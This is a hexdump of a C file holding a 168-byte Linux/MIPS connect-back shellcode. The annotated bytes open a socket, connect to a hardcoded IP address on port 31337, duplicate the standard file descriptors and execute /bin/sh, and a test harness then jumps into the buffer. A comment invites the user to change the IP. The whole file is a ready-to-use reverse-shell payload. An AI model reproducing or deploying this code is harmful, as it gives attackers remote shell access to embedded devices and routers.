00000000  2f 2a 0d 0a 20 2a 20 54  69 74 6c 65 3a 20 4c 69  |/*.. * Title: Li|
00000010  6e 75 78 2f 4d 49 50 53  20 2d 20 63 6f 6e 6e 65  |nux/MIPS - conne|
00000020  63 74 20 62 61 63 6b 20  73 68 65 6c 6c 63 6f 64  |ct back shellcod|
00000030  65 20 28 70 6f 72 74 20  30 78 37 61 36 39 29 20  |e (port 0x7a69) |
00000040  2d 20 31 36 38 20 62 79  74 65 73 2e 0d 0a 20 2a  |- 168 bytes... *|
00000050  20 41 75 74 68 6f 72 3a  20 72 69 67 61 6e 20 2d  | Author: rigan -|
00000060  20 69 6d 72 69 67 61 6e  20 5b 73 6f 62 61 63 68  | imrigan [sobach|
00000070  6b 61 5d 20 67 6d 61 69  6c 2e 63 6f 6d 0d 0a 20  |ka] gmail.com.. |
00000080  2a 2f 0d 0a 0d 0a 23 69  6e 63 6c 75 64 65 20 3c  |*/....#include <|
00000090  73 74 64 69 6f 2e 68 3e  0d 0a 0d 0a 63 68 61 72  |stdio.h>....char|
000000a0  20 73 63 5b 5d 20 3d 0d  0a 20 20 20 20 20 20 20  | sc[] =..       |
000000b0  20 20 22 5c 78 32 34 5c  78 30 66 5c 78 66 66 5c  |  "\x24\x0f\xff\|
000000c0  78 66 64 22 20 20 20 20  20 20 20 20 2f 2f 20 6c  |xfd"        // l|
000000d0  69 20 20 20 20 20 20 74  37 2c 2d 33 0d 0a 20 20  |i      t7,-3..  |
000000e0  20 20 20 20 20 20 20 22  5c 78 30 31 5c 78 65 30  |       "\x01\xe0|
000000f0  5c 78 32 30 5c 78 32 37  22 20 20 20 20 20 20 20  |\x20\x27"       |
00000100  20 2f 2f 20 6e 6f 72 20  20 20 20 20 61 30 2c 74  | // nor     a0,t|
00000110  37 2c 7a 65 72 6f 0d 0a  20 20 20 20 20 20 20 20  |7,zero..        |
00000120  20 22 5c 78 30 31 5c 78  65 30 5c 78 32 38 5c 78  | "\x01\xe0\x28\x|
00000130  32 37 22 20 20 20 20 20  20 20 20 2f 2f 20 6e 6f  |27"        // no|
00000140  72 20 20 20 20 20 61 31  2c 74 37 2c 7a 65 72 6f  |r     a1,t7,zero|
00000150  0d 0a 20 20 20 20 20 20  20 20 20 22 5c 78 32 38  |..         "\x28|
00000160  5c 78 30 36 5c 78 66 66  5c 78 66 66 22 20 20 20  |\x06\xff\xff"   |
00000170  20 20 20 20 20 2f 2f 20  73 6c 74 69 20 20 20 20  |     // slti    |
00000180  61 32 2c 7a 65 72 6f 2c  2d 31 0d 0a 20 20 20 20  |a2,zero,-1..    |
00000190  20 20 20 20 20 22 5c 78  32 34 5c 78 30 32 5c 78  |     "\x24\x02\x|
000001a0  31 30 5c 78 35 37 22 20  20 20 20 20 20 20 20 2f  |10\x57"        /|
000001b0  2f 20 6c 69 20 20 20 20  20 20 76 30 2c 34 31 38  |/ li      v0,418|
000001c0  33 20 28 20 73 79 73 5f  73 6f 63 6b 65 74 20 29  |3 ( sys_socket )|
000001d0  0d 0a 20 20 20 20 20 20  20 20 20 22 5c 78 30 31  |..         "\x01|
000001e0  5c 78 30 31 5c 78 30 31  5c 78 30 63 22 20 20 20  |\x01\x01\x0c"   |
000001f0  20 20 20 20 20 2f 2f 20  73 79 73 63 61 6c 6c 20  |     // syscall |
00000200  30 78 34 30 34 30 34 0d  0a 09 20 0d 0a 20 20 20  |0x40404... ..   |
00000210  20 20 20 20 20 20 22 5c  78 61 66 5c 78 61 32 5c  |      "\xaf\xa2\|
00000220  78 66 66 5c 78 66 66 22  20 20 20 20 20 20 20 20  |xff\xff"        |
00000230  2f 2f 20 73 77 20 20 20  20 20 20 76 30 2c 2d 31  |// sw      v0,-1|
00000240  28 73 70 29 0d 0a 20 20  20 20 20 20 20 20 20 22  |(sp)..         "|
00000250  5c 78 38 66 5c 78 61 34  5c 78 66 66 5c 78 66 66  |\x8f\xa4\xff\xff|
00000260  22 20 20 20 20 20 20 20  20 2f 2f 20 6c 77 20 20  |"        // lw  |
00000270  20 20 20 20 61 30 2c 2d  31 28 73 70 29 0d 0a 20  |    a0,-1(sp).. |
00000280  20 20 20 20 20 20 20 20  22 5c 78 32 34 5c 78 30  |        "\x24\x0|
00000290  66 5c 78 66 66 5c 78 66  64 22 20 20 20 20 20 20  |f\xff\xfd"      |
000002a0  20 20 2f 2f 20 6c 69 20  20 20 20 20 20 74 37 2c  |  // li      t7,|
000002b0  2d 33 20 28 20 73 61 5f  66 61 6d 69 6c 79 20 3d  |-3 ( sa_family =|
000002c0  20 41 46 5f 49 4e 45 54  20 29 0d 0a 20 20 20 20  | AF_INET )..    |
000002d0  20 20 20 20 20 22 5c 78  30 31 5c 78 65 30 5c 78  |     "\x01\xe0\x|
000002e0  37 38 5c 78 32 37 22 20  20 20 20 20 20 20 20 2f  |78\x27"        /|
000002f0  2f 20 6e 6f 72 20 20 20  20 20 74 37 2c 74 37 2c  |/ nor     t7,t7,|
00000300  7a 65 72 6f 0d 0a 20 20  20 20 20 20 20 20 20 22  |zero..         "|
00000310  5c 78 61 66 5c 78 61 66  5c 78 66 66 5c 78 65 30  |\xaf\xaf\xff\xe0|
00000320  22 20 20 20 20 20 20 20  20 2f 2f 20 73 77 20 20  |"        // sw  |
00000330  20 20 20 20 74 37 2c 2d  33 32 28 73 70 29 20 0d  |    t7,-32(sp) .|
00000340  0a 20 20 20 20 20 20 20  20 20 22 5c 78 33 63 5c  |.         "\x3c\|
00000350  78 30 65 5c 78 37 61 5c  78 36 39 22 20 20 20 20  |x0e\x7a\x69"    |
00000360  20 20 20 20 2f 2f 20 6c  75 69 20 20 20 20 20 74  |    // lui     t|
00000370  36 2c 30 78 37 61 36 39  20 28 20 73 69 6e 5f 70  |6,0x7a69 ( sin_p|
00000380  6f 72 74 20 3d 20 30 78  37 61 36 39 20 29 0d 0a  |ort = 0x7a69 )..|
00000390  20 20 20 20 20 20 20 20  20 22 5c 78 33 35 5c 78  |         "\x35\x|
000003a0  63 65 5c 78 37 61 5c 78  36 39 22 20 20 20 20 20  |ce\x7a\x69"     |
000003b0  20 20 20 2f 2f 20 6f 72  69 20 20 20 20 20 74 36  |   // ori     t6|
000003c0  2c 74 36 2c 30 78 37 61  36 39 0d 0a 20 20 20 20  |,t6,0x7a69..    |
000003d0  20 20 20 20 20 22 5c 78  61 66 5c 78 61 65 5c 78  |     "\xaf\xae\x|
000003e0  66 66 5c 78 65 34 22 20  20 20 20 20 20 20 20 2f  |ff\xe4"        /|
000003f0  2f 20 73 77 20 20 20 20  20 20 74 36 2c 2d 32 38  |/ sw      t6,-28|
00000400  28 73 70 29 0d 0a 20 20  20 20 20 20 20 20 20 0d  |(sp)..         .|
00000410  0a 20 20 20 20 20 20 2f  2a 20 3d 3d 3d 3d 3d 3d  |.      /* ======|
00000420  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 20 20  |==============  |
00000430  59 6f 75 20 63 61 6e 20  63 68 61 6e 67 65 20 69  |You can change i|
00000440  70 20 68 65 72 65 20 3b  29 20 3d 3d 3d 3d 3d 3d  |p here ;) ======|
00000450  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
00000460  20 2a 2f 0d 0a 20 20 20  20 20 20 20 20 20 22 5c  | */..         "\|
00000470  78 33 63 5c 78 30 64 5c  78 63 30 5c 78 61 38 22  |x3c\x0d\xc0\xa8"|
00000480  20 20 20 20 20 20 20 20  2f 2f 20 6c 75 69 20 20  |        // lui  |
00000490  20 20 20 74 35 2c 30 78  63 30 61 38 20 28 20 73  |   t5,0xc0a8 ( s|
000004a0  69 6e 5f 61 64 64 72 20  3d 20 30 78 63 30 61 38  |in_addr = 0xc0a8|
000004b0  20 2e 2e 2e 20 0d 0a 20  20 20 20 20 20 20 20 20  | ... ..         |
000004c0  22 5c 78 33 35 5c 78 61  64 5c 78 30 31 5c 78 36  |"\x35\xad\x01\x6|
000004d0  34 22 20 20 20 20 20 20  20 20 2f 2f 20 6f 72 69  |4"        // ori|
000004e0  20 20 20 20 20 74 35 2c  74 35 2c 30 78 31 36 34  |     t5,t5,0x164|
000004f0  20 20 20 20 20 20 20 20  20 20 20 2e 2e 2e 30 31  |           ...01|
00000500  36 34 20 29 0d 0a 20 20  20 20 20 20 2f 2a 20 3d  |64 )..      /* =|
00000510  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000550  3d 3d 3d 3d 3d 20 2a 2f  0d 0a 20 20 20 20 20 20  |===== */..      |
00000560  0d 0a 20 20 20 20 20 20  20 20 20 22 5c 78 61 66  |..         "\xaf|
00000570  5c 78 61 64 5c 78 66 66  5c 78 65 36 22 20 20 20  |\xad\xff\xe6"   |
00000580  20 20 20 20 20 2f 2f 20  73 77 20 20 20 20 20 20  |     // sw      |
00000590  74 35 2c 2d 32 36 28 73  70 29 0d 0a 20 20 20 20  |t5,-26(sp)..    |
000005a0  20 20 20 20 20 22 5c 78  32 33 5c 78 61 35 5c 78  |     "\x23\xa5\x|
000005b0  66 66 5c 78 65 32 22 20  20 20 20 20 20 20 20 2f  |ff\xe2"        /|
000005c0  2f 20 61 64 64 69 20 20  20 20 61 31 2c 73 70 2c  |/ addi    a1,sp,|
000005d0  2d 33 30 0d 0a 20 20 20  20 20 20 20 20 20 22 5c  |-30..         "\|
000005e0  78 32 34 5c 78 30 63 5c  78 66 66 5c 78 65 66 22  |x24\x0c\xff\xef"|
000005f0  20 20 20 20 20 20 20 20  2f 2f 20 6c 69 20 20 20  |        // li   |
00000600  20 20 20 74 34 2c 2d 31  37 20 28 20 61 64 64 72  |   t4,-17 ( addr|
00000610  6c 65 6e 20 3d 20 31 36  20 29 20 20 20 20 20 0d  |len = 16 )     .|
00000620  0a 20 20 20 20 20 20 20  20 20 22 5c 78 30 31 5c  |.         "\x01\|
00000630  78 38 30 5c 78 33 30 5c  78 32 37 22 20 20 20 20  |x80\x30\x27"    |
00000640  20 20 20 20 2f 2f 20 6e  6f 72 20 20 20 20 20 61  |    // nor     a|
00000650  32 2c 74 34 2c 7a 65 72  6f 20 0d 0a 20 20 20 20  |2,t4,zero ..    |
00000660  20 20 20 20 20 22 5c 78  32 34 5c 78 30 32 5c 78  |     "\x24\x02\x|
00000670  31 30 5c 78 34 61 22 20  20 20 20 20 20 20 20 2f  |10\x4a"        /|
00000680  2f 20 6c 69 20 20 20 20  20 20 76 30 2c 34 31 37  |/ li      v0,417|
00000690  30 20 28 20 73 79 73 5f  63 6f 6e 6e 65 63 74 20  |0 ( sys_connect |
000006a0  29 20 0d 0a 20 20 20 20  20 20 20 20 20 22 5c 78  |) ..         "\x|
000006b0  30 31 5c 78 30 31 5c 78  30 31 5c 78 30 63 22 20  |01\x01\x01\x0c" |
000006c0  20 20 20 20 20 20 20 2f  2f 20 73 79 73 63 61 6c  |       // syscal|
000006d0  6c 20 30 78 34 30 34 30  34 0d 0a 09 20 0d 0a 20  |l 0x40404... .. |
000006e0  20 20 20 20 20 20 20 20  22 5c 78 32 34 5c 78 30  |        "\x24\x0|
000006f0  66 5c 78 66 66 5c 78 66  64 22 20 20 20 20 20 20  |f\xff\xfd"      |
00000700  20 20 2f 2f 20 6c 69 20  20 20 20 20 20 74 37 2c  |  // li      t7,|
00000710  2d 33 0d 0a 20 20 20 20  20 20 20 20 20 22 5c 78  |-3..         "\x|
00000720  30 31 5c 78 65 30 5c 78  32 38 5c 78 32 37 22 20  |01\xe0\x28\x27" |
00000730  20 20 20 20 20 20 20 2f  2f 20 6e 6f 72 20 20 20  |       // nor   |
00000740  20 20 61 31 2c 74 37 2c  7a 65 72 6f 0d 0a 20 20  |  a1,t7,zero..  |
00000750  20 20 20 20 20 20 20 22  5c 78 38 66 5c 78 61 34  |       "\x8f\xa4|
00000760  5c 78 66 66 5c 78 66 66  22 20 20 20 20 20 20 20  |\xff\xff"       |
00000770  20 2f 2f 20 6c 77 20 20  20 20 20 20 61 30 2c 2d  | // lw      a0,-|
00000780  31 28 73 70 29 0d 0a 2f  2f 64 75 70 32 5f 6c 6f  |1(sp)..//dup2_lo|
00000790  6f 70 3a 0d 0a 20 20 20  20 20 20 20 20 20 22 5c  |op:..         "\|
000007a0  78 32 34 5c 78 30 32 5c  78 30 66 5c 78 64 66 22  |x24\x02\x0f\xdf"|
000007b0  20 20 20 20 20 20 20 20  2f 2f 20 6c 69 20 20 20  |        // li   |
000007c0  20 20 20 76 30 2c 34 30  36 33 20 28 20 73 79 73  |   v0,4063 ( sys|
000007d0  5f 64 75 70 32 20 29 0d  0a 20 20 20 20 20 20 20  |_dup2 )..       |
000007e0  20 20 22 5c 78 30 31 5c  78 30 31 5c 78 30 31 5c  |  "\x01\x01\x01\|
000007f0  78 30 63 22 20 20 20 20  20 20 20 20 2f 2f 20 73  |x0c"        // s|
00000800  79 73 63 61 6c 6c 20 30  78 34 30 34 30 34 0d 0a  |yscall 0x40404..|
00000810  20 20 20 20 20 20 20 20  20 22 5c 78 32 30 5c 78  |         "\x20\x|
00000820  61 35 5c 78 66 66 5c 78  66 66 22 20 20 20 20 20  |a5\xff\xff"     |
00000830  20 20 20 2f 2f 20 61 64  64 69 20 20 20 20 61 31  |   // addi    a1|
00000840  2c 61 31 2c 2d 31 0d 0a  20 20 20 20 20 20 20 20  |,a1,-1..        |
00000850  20 22 5c 78 32 34 5c 78  30 31 5c 78 66 66 5c 78  | "\x24\x01\xff\x|
00000860  66 66 22 20 20 20 20 20  20 20 20 2f 2f 20 6c 69  |ff"        // li|
00000870  20 20 20 20 20 20 61 74  2c 2d 31 0d 0a 20 20 20  |      at,-1..   |
00000880  20 20 20 20 20 20 22 5c  78 31 34 5c 78 61 31 5c  |      "\x14\xa1\|
00000890  78 66 66 5c 78 66 62 22  20 20 20 20 20 20 20 20  |xff\xfb"        |
000008a0  2f 2f 20 62 6e 65 20 20  20 20 20 61 31 2c 61 74  |// bne     a1,at|
000008b0  2c 20 64 75 70 32 5f 6c  6f 6f 70 0d 0a 09 20 0d  |, dup2_loop... .|
000008c0  0a 20 20 20 20 20 20 20  20 20 22 5c 78 32 38 5c  |.         "\x28\|
000008d0  78 30 36 5c 78 66 66 5c  78 66 66 22 20 20 20 20  |x06\xff\xff"    |
000008e0  20 20 20 20 2f 2f 20 73  6c 74 69 20 20 20 20 61  |    // slti    a|
000008f0  32 2c 7a 65 72 6f 2c 2d  31 0d 0a 20 20 20 20 20  |2,zero,-1..     |
00000900  20 20 20 20 22 5c 78 33  63 5c 78 30 66 5c 78 32  |    "\x3c\x0f\x2|
00000910  66 5c 78 32 66 22 20 20  20 20 20 20 20 20 2f 2f  |f\x2f"        //|
00000920  20 6c 75 69 20 20 20 20  20 74 37 2c 30 78 32 66  | lui     t7,0x2f|
00000930  32 66 0d 0a 20 20 20 20  20 20 20 20 20 22 5c 78  |2f..         "\x|
00000940  33 35 5c 78 65 66 5c 78  36 32 5c 78 36 39 22 20  |35\xef\x62\x69" |
00000950  20 20 20 20 20 20 20 2f  2f 20 6f 72 69 20 20 20  |       // ori   |
00000960  20 20 74 37 2c 74 37 2c  30 78 36 32 36 39 0d 0a  |  t7,t7,0x6269..|
00000970  20 20 20 20 20 20 20 20  20 22 5c 78 61 66 5c 78  |         "\xaf\x|
00000980  61 66 5c 78 66 66 5c 78  66 34 22 20 20 20 20 20  |af\xff\xf4"     |
00000990  20 20 20 2f 2f 20 73 77  20 20 20 20 20 20 74 37  |   // sw      t7|
000009a0  2c 2d 31 32 28 73 70 29  0d 0a 20 20 20 20 20 20  |,-12(sp)..      |
000009b0  20 20 20 22 5c 78 33 63  5c 78 30 65 5c 78 36 65  |   "\x3c\x0e\x6e|
000009c0  5c 78 32 66 22 20 20 20  20 20 20 20 20 2f 2f 20  |\x2f"        // |
000009d0  6c 75 69 20 20 20 20 20  74 36 2c 30 78 36 65 32  |lui     t6,0x6e2|
000009e0  66 0d 0a 20 20 20 20 20  20 20 20 20 22 5c 78 33  |f..         "\x3|
000009f0  35 5c 78 63 65 5c 78 37  33 5c 78 36 38 22 20 20  |5\xce\x73\x68"  |
00000a00  20 20 20 20 20 20 2f 2f  20 6f 72 69 20 20 20 20  |      // ori    |
00000a10  20 74 36 2c 74 36 2c 30  78 37 33 36 38 0d 0a 20  | t6,t6,0x7368.. |
00000a20  20 20 20 20 20 20 20 20  22 5c 78 61 66 5c 78 61  |        "\xaf\xa|
00000a30  65 5c 78 66 66 5c 78 66  38 22 20 20 20 20 20 20  |e\xff\xf8"      |
00000a40  20 20 2f 2f 20 73 77 20  20 20 20 20 20 74 36 2c  |  // sw      t6,|
00000a50  2d 38 28 73 70 29 0d 0a  20 20 20 20 20 20 20 20  |-8(sp)..        |
00000a60  20 22 5c 78 61 66 5c 78  61 30 5c 78 66 66 5c 78  | "\xaf\xa0\xff\x|
00000a70  66 63 22 20 20 20 20 20  20 20 20 2f 2f 20 73 77  |fc"        // sw|
00000a80  20 20 20 20 20 20 7a 65  72 6f 2c 2d 34 28 73 70  |      zero,-4(sp|
00000a90  29 0d 0a 20 20 20 20 20  20 20 20 20 22 5c 78 32  |)..         "\x2|
00000aa0  37 5c 78 61 34 5c 78 66  66 5c 78 66 34 22 20 20  |7\xa4\xff\xf4"  |
00000ab0  20 20 20 20 20 20 2f 2f  20 61 64 64 69 75 20 20  |      // addiu  |
00000ac0  20 61 30 2c 73 70 2c 2d  31 32 0d 0a 20 20 20 20  | a0,sp,-12..    |
00000ad0  20 20 20 20 20 22 5c 78  32 38 5c 78 30 35 5c 78  |     "\x28\x05\x|
00000ae0  66 66 5c 78 66 66 22 20  20 20 20 20 20 20 20 2f  |ff\xff"        /|
00000af0  2f 20 73 6c 74 69 20 20  20 20 61 31 2c 7a 65 72  |/ slti    a1,zer|
00000b00  6f 2c 2d 31 0d 0a 20 20  20 20 20 20 20 20 20 22  |o,-1..         "|
00000b10  5c 78 32 34 5c 78 30 32  5c 78 30 66 5c 78 61 62  |\x24\x02\x0f\xab|
00000b20  22 20 20 20 20 20 20 20  20 2f 2f 20 6c 69 20 20  |"        // li  |
00000b30  20 20 20 20 76 30 2c 34  30 31 31 20 28 20 73 79  |    v0,4011 ( sy|
00000b40  73 5f 65 78 65 63 76 65  20 29 0d 0a 20 20 20 20  |s_execve )..    |
00000b50  20 20 20 20 20 22 5c 78  30 31 5c 78 30 31 5c 78  |     "\x01\x01\x|
00000b60  30 31 5c 78 30 63 22 3b  20 20 20 20 20 20 20 2f  |01\x0c";       /|
00000b70  2f 20 73 79 73 63 61 6c  6c 20 30 78 34 30 34 30  |/ syscall 0x4040|
00000b80  34 0d 0a 20 20 20 20 20  20 20 20 20 0d 0a 76 6f  |4..         ..vo|
00000b90  69 64 20 6d 61 69 6e 28  76 6f 69 64 29 0d 0a 7b  |id main(void)..{|
00000ba0  0d 0a 20 20 20 20 20 20  20 0d 0a 20 20 20 20 20  |..       ..     |
00000bb0  20 20 76 6f 69 64 28 2a  73 29 28 76 6f 69 64 29  |  void(*s)(void)|
00000bc0  3b 0d 0a 20 20 20 20 20  20 20 70 72 69 6e 74 66  |;..       printf|
00000bd0  28 22 73 69 7a 65 3a 20  25 64 5c 6e 22 2c 20 73  |("size: %d\n", s|
00000be0  69 7a 65 6f 66 28 73 63  29 29 3b 0d 0a 20 20 20  |izeof(sc));..   |
00000bf0  20 20 20 20 73 20 3d 20  73 63 3b 0d 0a 20 20 20  |    s = sc;..   |
00000c00  20 20 20 20 73 28 29 3b  0d 0a 7d                 |    s();..}|
00000c0b
